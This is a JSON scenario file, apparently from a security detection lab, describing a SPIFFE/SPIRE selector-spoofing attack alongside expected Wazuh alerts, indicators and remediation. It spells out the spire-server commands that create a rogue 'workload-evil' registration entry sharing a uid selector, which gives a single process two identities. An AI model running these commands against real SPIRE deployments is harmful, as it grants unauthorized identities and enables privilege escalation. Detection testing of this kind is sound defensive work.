@@ -1,0 +1,148 @@
+{
+  "id": "S7-01",
+  "name": "SPIFFE Selector Spoofing",
+  "category": "SPIFFE/SPIRE",
+  "version": "1.0",
+  "description": "Create overlapping registration entries with the same selector to obtain multiple workload identities for a single process",
+  "difficulty": "Hard",
+  "real_world_relevance": "Eviatar Gerzi (CyberArk) 'The Machine with Many Faces' — selector spoofing in SPIRE deployments",
+
+  "mitre_attack": {
+    "tactics": ["Credential Access", "Privilege Escalation"],
+    "techniques": [
+      {"id": "T1078", "name": "Valid Accounts"},
+      {"id": "T1098", "name": "Account Manipulation"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["spire-server", "spire-agent", "k8s-node-1"],
+    "network": "k8s_net",
+    "profile": "k8s"
+  },
+
+  "attack_flow": {
+    "description": "Attacker creates overlapping registration entries that cause a single process to receive multiple SPIFFE identities",
+    "diagram": [
+      "1. Attacker gains access to SPIRE Server registration API",
+      "2. Creates legitimate entry: spiffe://example.org/web-frontend with unix:uid:1000",
+      "3. Creates rogue entry: spiffe://example.org/workload-evil with unix:uid:1000",
+      "4. Any process running as uid:1000 receives BOTH SVIDs",
+      "5. Attacker uses rogue identity to access other services"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "Registration Entry Creation",
+      "description": "Create overlapping entries with the same selector",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-server",
+          "command": "/opt/spire/bin/spire-server entry create -parentID AGENT_ID -spiffeID spiffe://example.org/web-frontend -selector unix:uid:1000 -socketPath /tmp/spire-server/private/api.sock",
+          "description": "Create legitimate workload entry"
+        },
+        {
+          "type": "exec",
+          "target": "spire-server",
+          "command": "/opt/spire/bin/spire-server entry create -parentID AGENT_ID -spiffeID spiffe://example.org/workload-evil -selector unix:uid:1000 -socketPath /tmp/spire-server/private/api.sock",
+          "description": "Create rogue entry with overlapping selector"
+        }
+      ]
+    },
+    {
+      "name": "Identity Fetch",
+      "description": "Fetch SVIDs to confirm dual identity",
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "/opt/spire/bin/spire-agent api fetch x509 -socketPath /opt/spire/sockets/workload_api.sock",
+          "description": "Fetch X.509 SVID — should return TWO identities"
+        }
+      ]
+    },
+    {
+      "name": "Detection Confirmation",
+      "description": "Trigger identity monitor for confirmed detection",
+      "actions": [
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "python3 /opt/spire-monitor/spire_identity_monitor.py",
+          "description": "Run SPIRE identity monitor to detect multi-identity anomaly"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "SPIRE Server Audit",
+      "description": "Registration entry created via BatchCreateEntry API",
+      "wazuh_rule": "101020"
+    },
+    {
+      "type": "SPIRE Server Audit",
+      "description": "Registration entry uses weak/spoofable selector (unix:uid)",
+      "wazuh_rule": "101021"
+    },
+    {
+      "type": "SPIRE Identity Monitor",
+      "description": "CONFIRMED multi-identity per PID — selector spoofing detected",
+      "wazuh_rule": "101007"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "101020",
+      "level": 12,
+      "description": "NHI: SPIRE registration entry created"
+    },
+    {
+      "rule_id": "101021",
+      "level": 12,
+      "description": "NHI: SPIRE registration with weak/spoofable selector"
+    },
+    {
+      "rule_id": "101007",
+      "level": 14,
+      "description": "NHI: CONFIRMED multi-identity per PID — selector spoofing"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Delete rogue registration entry",
+      "Rotate affected SVIDs",
+      "Audit all registration entries for overlapping selectors"
+    ],
+    "long_term": [
+      "Use composite selectors (uid + path + sha256) instead of single selectors",
+      "Restrict registration API access to authorized operators only",
+      "Enable SPIRE Server audit logging and forward to SIEM",
+      "Implement selector validation policies"
+    ]
+  },
+
+  "demo_script": {
+    "container": "spire-server",
+    "commands": [
+      "scripts/talk/demo-4-spiffe-spoofing.sh"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "The Machine with Many Faces — Eviatar Gerzi (CyberArk)",
+      "url": "https://nullcon.net/"
+    },
+    {
+      "title": "SPIFFE/SPIRE Documentation",
+      "url": "https://spiffe.io/docs/"
+    }
+  ]
+}
